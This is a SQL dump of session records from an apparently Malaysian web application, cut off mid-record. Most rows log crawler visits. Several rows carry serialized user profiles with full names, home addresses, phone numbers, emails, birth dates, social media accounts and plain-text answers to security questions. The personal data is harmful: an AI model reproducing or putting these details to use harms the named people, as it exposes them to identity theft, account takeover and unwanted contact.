('5d5ff19c80c93fbcd78a03874d839f23', '115.164.189.152', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LR', 1461418335, 'a:1:{s:12:"me_id_parent";s:88:"tZHYvTCfFrU5uWUyfra6e27JjiHr6wNfPVBfLCSxKDD7ZTR8QtfWppTBdL2k4Rj4pBCPgQbMxDek9C_XbTgYPA==";}'),
('5ddf71444fcd02198fda71222380791d', '180.76.15.144', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461845902, ''),
('5e3164c18a73b2cade7efd58b00bc6b2', '180.76.15.27', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461896568, ''),
('5e5adc0a226105ac321dc33b231d4808', '180.76.15.136', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461838454, ''),
('5e64b6cf5b53c81918669d7b96f93876', '180.76.15.33', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461694346, ''),
('5e8b24135e58ed1a6eb8c05235706612', '178.162.199.90', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko', 1461912307, ''),
('5e9b15c2ca7a3d7a6f8ec8cfd439741d', '130.193.51.34', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461247724, ''),
('5eb5332cae286854dcda279f8690b4cd', '203.82.90.127', 'Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-P5', 1461414967, ''),
('5ebe286c4b0718290e14a697f43c164a', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461436800, ''),
('5ec47fddc68558b8a73392228fc09e3e', '66.249.64.36', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461797769, ''),
('5ed085e951a96d99eade06d2a268e5a0', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894714, ''),
('5ed3eb010a5faa9e3f1489dcf2c79c6a', '180.76.15.162', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461127524, ''),
('5ee1c00262807457481ee40e745ecb28', '5.39.222.159', 'masscan/1.0 (https://github.com/robertdavidgraham/', 1461583432, ''),
('5f095e41176552ac5de9b3dd16554a3a', '141.8.142.82', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461247725, ''),
('5f3bc131a1e20f2810a5de47e73a9c41', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232010, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('5f7f9ecf8cad3b746c8e0411ec66df5e', '203.82.90.79', 'Mozilla/5.0 (Linux; Android 4.4.2; GT-N7100 Build/', 1461420525, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('5f846cd6d9f82fd08dd63253265752ae', '45.33.36.127', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461861870, ''),
('5f942531feb56ee4bf686f169c1e5a03', '66.249.66.30', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461250327, ''),
('5fbd19f57150dfbcb657a77498ace361', '173.252.106.115', '0', 1461244032, ''),
('600dc530d8dd641f6651714d2e881ad3', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461734245, ''),
('6032a73b6be9a710511aaf6b2114f019', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231965, ''),
('605e1f8e36a9373f828e7b3aaefa3e9d', '180.76.15.156', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461127598, ''),
('606d3729f644df4ce3d69c2a7542df0d', '123.136.112.50', 'Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LR', 1461456673, 'a:1:{s:12:"me_id_parent";s:88:"jmD1ibObqSyyTGNCJ7gx3jYtBuzXXiBaG6ICx-vUcz-ekSE55y001Imz2OYbYbRYyWyMeuB8aNafcrnEJPTSdA==";}'),
('60a2d76a3458048ae2c60c1e905f95ef', '207.46.13.19', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461187390, ''),
('60ad9c49c92af70130c3a0fa4a21e06a', '149.154.167.161', 'TelegramBot (like TwitterBot)', 1461766337, 'a:1:{s:12:"me_id_parent";s:8:"Cz4IPw==";}'),
('60c4efd30631c36662298bbff4868fbd', '175.136.140.216', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461761730, ''),
('60cc6dd2a5c7ceb6b048c35b426fb7a6', '180.76.15.26', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461408225, ''),
('611af1862c86a60ccb043ca894a596ba', '40.77.167.27', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461464635, ''),
('611d69d334aafaeb54f6f24da3de0c2a', '66.220.146.151', 'facebookexternalhit/1.1', 1461429618, ''),
('619d0be1f9c313d98220f148cc5f7a16', '66.249.69.116', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461628131, ''),
('61a22f6c8fc98c87e812ba4fe6344652', '139.195.10.210', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461152831, ''),
('61eb7a5d656ad57b5f4399f0ff75c4d0', '113.210.62.149', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461637935, ''),
('6217861fc94bc657a3ce39af7485e604', '180.76.15.11', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461828179, ''),
('624561a7063c2f3b0b2ffdf7bb60b346', '45.33.59.157', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461134175, ''),
('6276e4e8e1b29bde70ed9ea8e3ac8948', '66.249.64.86', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461811090, ''),
('62c165ff4be00ea73e7cc1cf5fc3a3a1', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461188321, ''),
('62c5a0abace803f8225d7aba97617c32', '180.76.15.27', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461676868, ''),
('62e2509f85e370106479ae6e201f24dc', '180.76.15.157', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461609231, ''),
('630ce78fd8b0f990d296ee07c15f39c6', '180.76.15.26', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461720038, ''),
('634cdd281d32cd5fc717c9b4c7eaea1a', '180.76.15.162', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461154585, ''),
('639594fd4f5c9b791904c5b08ddc6181', '113.210.62.47', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461423216, ''),
('6398996e027370a3e2a4c96522c3fe8d', '178.63.123.105', 'python-requests/2.9.1', 1461104413, ''),
('6398bbda4faaf11a8f23d4fdb8642e0b', '45.33.59.157', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461744125, ''),
('63a32b328917882e5e1e5742d2ef4177', '64.246.165.140', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.', 1461256675, ''),
('63c6eb02d424abca1126b84b1c07dd27', '141.8.142.82', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461485864, ''),
('641db541ff7fe433468c1789e2dacb54', '180.76.15.16', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461655408, ''),
('64915d29c5bfcaf2e24c377651f41e71', '115.135.237.193', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461414228, ''),
('649f29ff2699d77efad1a032b0cd6f26', '62.210.170.165', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461755769, ''),
('64f24f55ab99d0e1a3d1e4e7a794bfc1', '180.76.15.34', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461149089, ''),
('64f936b5f1a1b960c1ff9230e6fb2a8d', '180.76.15.152', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461864491, ''),
('65061b5c92d410d049528841d6e846b4', '199.16.156.124', 'Twitterbot/1.0', 1461408714, 'a:1:{s:12:"me_id_parent";s:88:"hicxuohm4Z3YDNyS_SWRuBB14CAnsfi8i4U-nfhZsgWjjUX3_vQ8O3ny5-jyIJmnehUrg6HrHvom5HFJ2Ju6sg==";}'),
('65081d44542d1e1a959af9f619e62ed0', '66.249.69.116', 'SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuratio', 1461442190, ''),
('6508e35b67ebbd0f8fca31e3059dad62', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 1461699350, ''),
('65171583bab8706b8181699c6d765f44', '14.1.200.21', 'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo S930 Bui', 1461558388, 'a:1:{s:12:"me_id_parent";s:88:"tUwscy9iNYC3E0UtjwO_8ltbnpkfLOZvIZKM96iEXnwQMVzoPF1ai-Tcn0aGRDbNr0BZl2P51CFKCX3lIdS01Q==";}'),
('65361eb506c5f5b66e3941aa374e8b4d', '180.76.15.26', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461598762, ''),
('6580e41326ddbe38a838739375935de6', '141.8.132.32', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461247723, ''),
('658d21feae0317238460f295a5e0c4be', '52.20.15.169', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28', 1461421113, 'a:1:{s:12:"me_id_parent";s:88:"_cbfVIJ62-V0pF7mTMYC5gGBykORR4ayriv5F33mnOImB9HHCQ1uVrH9d-iMIp7LYXzz7fKR8Q_nyKBRT81Vzg==";}'),
('65a25fc0e5ea9eba780e815d090379d4', '180.76.15.153', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461943229, ''),
('65c3fe4aff5089b5e27ab5fb507239b8', '115.164.56.24', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461741487, ''),
('65e98c41f0cd39e99bade7ee1b57493e', '113.210.62.149', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461640664, ''),
('660cbb60d290cc8662aef0d692a7030f', '45.55.133.227', '0', 1461155551, ''),
('6641ce48167c318273c61ec208418c98', '207.46.13.125', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461169923, ''),
('66757c55a69d597dca7f9972e3d6db71', '157.55.39.163', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461277470, ''),
('668abafc752dee0a691e8b4a501d0f71', '180.76.15.15', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461151736, ''),
('66b634526bc0bcf11c68516dc3e31a3f', '180.76.15.145', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461501321, ''),
('66be3f4c6528800bd53b2724af849261', '78.158.11.226', 'Lynx/2.8.5rel.1 libwww-FM/2.15FC SSL-MM/1.4.1c Ope', 1461878835, ''),
('66c24dba1526fc4dcf2259252daa024a', '66.249.66.165', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461246092, ''),
('66e2d504a3e03f3fa1f13f9dee9c37cb', '69.30.226.222', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1;', 1461192641, ''),
('670bad67b4c67e2dea6bd81a696417d2', '5.248.253.133', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)', 1461930874, ''),
('671bb016a5dc77ca9a8a97c760fefef7', '157.55.39.150', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461468429, ''),
('6722547c324f0c2f574ee250b721a69b', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461898647, ''),
('673145e286bcd088788856ec33fff120', '180.76.15.143', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461289663, ''),
('6746227ce19a1f73345bd913255b9fa4', '164.132.161.55', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461103290, ''),
('67505ca6977e1f54985bf48ac25549c9', '173.252.122.122', 'facebookexternalhit/1.1', 1461421819, 'a:1:{s:12:"me_id_parent";s:88:"8_Jg4SZ7LrWfqkxnyZ4sSp6f2PLw3TRtw7DHX0L3e0wddfq4FcMEpZNOxPs1dK0RZdk7h5QpiqhW7idN07JFhA==";}'),
('676c9d85feb0c42c7af6e6fdcdb80da4', '210.195.95.114', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461480849, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('6774e0fbca484ef42604c3a09b402b80', '144.76.93.46', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461787345, ''),
('677d70c99c8233a07af8a86632e3e649', '13.92.241.115', 'semanticbot', 1461739125, ''),
('679ccda1bb353be95a71bf8fbeaa4d8c', '180.76.15.11', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461419322, ''),
('67e4a0cca5924238bbb081a883105873', '180.76.15.32', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461102055, ''),
('686bd6d0af8d054da030a7055c41762d', '60.52.24.225', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461290827, ''),
('688b58a34d09c436a9dfbff60e699763', '40.77.167.27', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461464635, ''),
('68a251be0c61ae19bfa59c53f0c87c6c', '115.164.50.83', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461408930, 'a:1:{s:12:"me_id_parent";s:88:"2MiYnaqOM6xVg5rz_RPfHz7PjLnDf23TTPR90VujlXWV-IV2aM1c4zhpkCK6AUheVgUz36tZR-YOrXvGq8J38A==";}'),
('68ae3b8025f67fc9a9ef47c9e5be431a', '66.249.69.4', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461517511, ''),
('6909b2ba299d335439bfbad7119a7306', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1458531825, ''),
('6929d8579122618a43abbc497f2f5fa7', '5.248.253.133', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)', 1461589810, ''),
('69318c92c8fbedb5c5cc4a14126c3bb0', '173.252.90.240', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461407983, 'a:1:{s:12:"me_id_parent";s:88:"CGQfycj9ERQl0sclgS1R7DVE1TQrYOsKiKpLj092AXlVmPVR7neyTFZC2wPfQy8I97sywRU1P_Yxsf_Oa2ZKJg==";}'),
('69591ebc5786a72f91bb1a50ac011d9a', '115.134.65.152', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461480177, 'a:1:{s:12:"me_id_parent";s:88:"eMuh83bH-IbcOmzMK37k9dka-TsI_UH2Y69nADPE4726Mu1deO6DXXvET3G9qk-MIUagGiRi5vNFL4as0YuheA==";}'),
('697ac2dbe830353ea47d49c7a102b053', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461186643, ''),
('69e4125a86e942eded1b935c258e552f', '66.249.85.227', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461900421, ''),
('69e41ff4236f5b42522557f4372c8891', '141.8.132.32', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461485863, ''),
('6a06cc2f7e3ddb5fe9b52b78cf2bfdbf', '66.249.69.116', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461640264, ''),
('6a0d2534c5cf56888ffed7f3ebd33e8b', '184.168.152.7', '0', 1461242311, ''),
('6a0e44e32d718215ec2c1ccced0c0d98', '178.137.93.24', 'Mozilla/5.0 (Windows 10; WOW64; rv:41.0) Gecko/201', 1461836765, ''),
('6a192994c901fe9b86c1df99f5fe091d', '180.76.15.161', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461522811, ''),
('6a25151c742c709a2e771baebf00ba36', '180.76.15.31', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461586426, ''),
('6a3bfe57b27f2c3d690cf89bca24490e', '175.144.126.179', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00J Build', 1461583565, 'a:1:{s:12:"me_id_parent";s:88:"rDOwFmS5EnTOeLfjpmxR24BDGE6xStSmVphpegzS-M7qckOYEo9DyfD7mvxbarDFQrIzKTmafMV16Kv9kMCNKA==";}'),
('6a40d2d403a3b300ec7b0cd987ad49c1', '69.171.228.122', '0', 1461408004, 'a:1:{s:12:"me_id_parent";s:88:"y_nmk6bSGU0dGp-JzVVRfpH9ggR6gnJZkI4DD8WhsHLxsswbIoBIJc3iu_LQBuXne9S3vTIRh2g9dZzcjGOosg==";}'),
('6a9c6f19d1f400ee5dddd5a861e804dd', '66.249.69.116', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461542238, ''),
('6ad8ea6d2feb7db47b34687068049ed6', '180.76.15.159', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461781326, ''),
('6ae315bc5f065629f9603dd7bf491b4c', '13.92.241.115', 'semanticbot', 1461739141, ''),
('6afbeb33e8e2cc2a1fd3c9ba0bc9c7ac', '91.209.51.22', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461154910, ''),
('6bad1d33a405f297e1d8b0cca521e70a', '103.6.196.115', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461740043, ''),
('6c551d224b1bc7c7663eb62d880d8069', '113.210.57.165', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461420790, ''),
('6cb8343d0e9782309fb59934696d0bf5', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461499519, '');
INSERT INTO `ci_sessions` (`session_id`, `ip_address`, `user_agent`, `last_activity`, `user_data`) VALUES
('6ce591e7b654851b29bf63bd9a4c2919', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461267074, 'a:50:{s:5:"me_id";s:1:"1";s:8:"me_image";s:36:"99271c3805aa830738485064b3707cc9.jpg";s:12:"me_firstname";s:12:"DP System HQ";s:11:"me_lastname";s:8:"Dinarpal";s:11:"me_username";s:4:"dphq";s:11:"me_question";s:22:"What is my pet''s name?";s:9:"me_answer";s:5:"comel";s:14:"me_unique_link";s:200:"http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://local";s:11:"me_address1";s:44:"J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.";s:8:"me_city1";s:10:"AYER KEROH";s:9:"me_state1";s:6:"MELAKA";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"MALAYSIA";s:11:"me_address2";s:28:"91, JALAN KERAI, SG. RETANG.";s:8:"me_city2";s:8:"JERANTUT";s:9:"me_state2";s:6:"PAHANG";s:12:"me_postcode2";s:5:"27000";s:11:"me_country2";s:8:"MALAYSIA";s:22:"me_government_issue_id";s:5:"MY001";s:17:"me_driver_license";s:7:"B and D";s:11:"me_phone_no";s:10:"0199737579";s:13:"me_birth_date";s:10:"1989-10-31";s:14:"me_description";s:0:"";s:14:"me_maiden_name";s:4:"Ntoh";s:14:"me_nationality";s:8:"Malaysia";s:11:"me_facebook";s:36:"https://www.facebook.com/kidzeclipes";s:10:"me_twitter";s:31:"https://twitter.com/kidzeclipes";s:12:"me_instagram";s:34:"https://www.instagram.com/umaq_89/";s:13:"me_googleplus";s:55:"https://plus.google.com/u/0/110272712192644641706/posts";s:14:"me_whatsapp_no";s:10:"0199737579";s:11:"me_telegram";s:11:"019-9737579";s:9:"me_wechat";s:15:"+6 019-973 7579";s:8:"me_email";s:21:"kidzeclipes@gmail.com";s:16:"me_register_date";s:19:"2014-11-10 10:12:00";s:15:"me_account_type";s:1:"2";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-22T03:30:18+08:00";s:12:"me_magic_num";s:32:"0d4368f80cd1d149576c068211e89fbf";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:18:"Tuffah Informatics";s:10:"me_reg_num";s:11:"MA0182480-H";s:15:"me_company_doc1";s:36:"8dbaa9d1e7f114245d186c546ab9a7d6.jpg";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:36:"25e878659a4d2c4c9f76576fa1656530.jpg";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"DP";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;}'),
('6d353369fda939fb2afa96780dc60b8a', '113.210.55.5', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461803643, 'a:51:{s:5:"me_id";s:2:"26";s:8:"me_image";s:36:"84cc8071ffe9754d941efdd89ce6c467.png";s:12:"me_firstname";s:13:"Mohd Zulkefli";s:11:"me_lastname";s:6:"Hamdan";s:11:"me_username";s:3:"mzh";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"mzh";s:14:"me_unique_link";s:32:"eab54c7fb6a1daabe6b845752b0b5234";s:11:"me_address1";s:20:"No 29, Jalan Jati 18";s:8:"me_city1";s:13:"Batu Berendam";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75350";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:20:"No 29, Jalan Jati 18";s:8:"me_city2";s:13:"Batu Berendam";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75350";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0122228069";s:13:"me_birth_date";s:10:"1989-02-09";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:9:"ijulkefli";s:10:"me_twitter";s:9:"ijulkefli";s:12:"me_instagram";s:9:"ijulkefli";s:13:"me_googleplus";s:9:"ijulkefli";s:14:"me_whatsapp_no";s:10:"0122228069";s:11:"me_telegram";s:10:"0122228069";s:9:"me_wechat";s:9:"ijulkefli";s:8:"me_email";s:16:"ijul89@gmail.com";s:16:"me_register_date";s:19:"2016-04-23 22:15:46";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-27T21:27:52+08:00";s:12:"me_magic_num";s:32:"ba64d4c8f84e926af9e9955542eff18c";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;}'),
('6d4256c90b80164500e427e14a53a408', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461913389, ''),
('6d528ca5d0f61816662b0a61e923271c', '202.58.86.18', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Geck', 1461542970, ''),
('6da3353be4dfa8ed6a844318d444c66a', '45.55.229.99', 'Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/201001', 1461718313, ''),
('6e436790d8a71bf48f626ccb43fc5a9f', '157.55.39.71', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461150359, ''),
('6ea18b32602f96bf6ec63c52b7e67ae2', '82.193.127.15', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461299100, ''),
('6ebc325396e02086164fe3e820132753', '180.76.15.7', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461779226, ''),
('6efb4db35274af805f80872688e1024c', '66.249.69.45', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461643786, ''),
('6f43ddb0a706a4453b4a756dc06ae5ec', '180.76.15.140', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461741779, ''),
('6f68e232775d0b1bda7dc0c0d94aee41', '115.164.50.10', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461488111, ''),
('6f726e02124385add3255258089d4656', '130.193.51.30', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461255825, ''),
('6f74f0bfb9527a04f1eb2b44a085deb4', '207.46.13.36', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461504414, ''),
('6f7f3d436e45be4dea4283b0a0180ea3', '113.210.60.46', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461430274, ''),
('6fa7556f14d00438c13a5cddc5d4c4a0', '173.252.122.121', 'facebookexternalhit/1.1', 1461496320, 'a:1:{s:12:"me_id_parent";s:88:"K-6cnNMODONFWgn49XyZpMvZ_c9Sdx7-0ufTiqCAv8kthDB0SMrbQr2KxlFTWbfLyHXQyL58pGvQw67jqbOaBw==";}'),
('700ba2c93185ba30efd1671a64da9dac', '180.76.15.11', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461849640, ''),
('702199c8f409952ee1f670877903c4c7', '180.76.15.19', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461133657, ''),
('7047d0e7a8079fd841d0d50815436eb0', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 1461699347, ''),
('705bc33316c9bca93b2bdc1642b88675', '113.210.57.165', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461420861, ''),
('70b7b5730fe74d3410b3b8a3b7a94dc7', '180.76.15.25', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461939734, ''),
('70cfe020a196769ec6ea0ea97403b504', '123.125.71.112', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461733239, ''),
('70d4e2728b1380009d96b582f8052175', '183.171.23.161', 'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 2 Bu', 1461423213, 'a:1:{s:12:"me_id_parent";s:1:"0";}'),
('7103aa51ef04ab49a18718936bc2404f', '66.249.79.118', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461196148, ''),
('710c9c386f4ffacfb64be8253c06308a', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461766943, ''),
('7165acfb1531603881fe9d7ec40bcb74', '66.249.64.36', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461826241, ''),
('7195e22f725cb5a96de0229029ca1f19', '82.193.127.15', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461299108, ''),
('7196140c25c3c594782d378bf65fb11d', '113.210.55.28', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-N9005 Build/', 1461462115, ''),
('71c48a222d2e0d70b9d55d77245ad4fb', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461441469, ''),
('71d49a3db78983f29a131093664ffca9', '66.249.65.37', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461135405, ''),
('71e901602d3eafd6d130e797c11fe99d', '1.32.71.225', 'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo TAB 2 A7', 1461569425, 'a:1:{s:12:"me_id_parent";s:88:"EvlihIegS8drRmSK1L6b-iAeyPG3ZIeio9V5i9rnHsdNYgiMCfDoS_clpoQcvux7tnqN-2KvPTS8w6GAyo-Mig==";}'),
('72026fb32c6b1c0ab51416e275f4dbb3', '157.55.39.150', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461464598, ''),
('7209635b48be834565ded7d577836081', '211.24.232.114', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461654618, 'a:51:{s:5:"me_id";s:2:"46";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:10:"rizalrahim";s:11:"me_lastname";s:10:"rizalrahim";s:11:"me_username";s:10:"rizalrahim";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:10:"rizalrahim";s:14:"me_unique_link";s:32:"36e46e675367bc7cdad4d2f7082570fb";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:23:"rizal.rahim82@gmail.com";s:16:"me_register_date";s:19:"2016-04-26 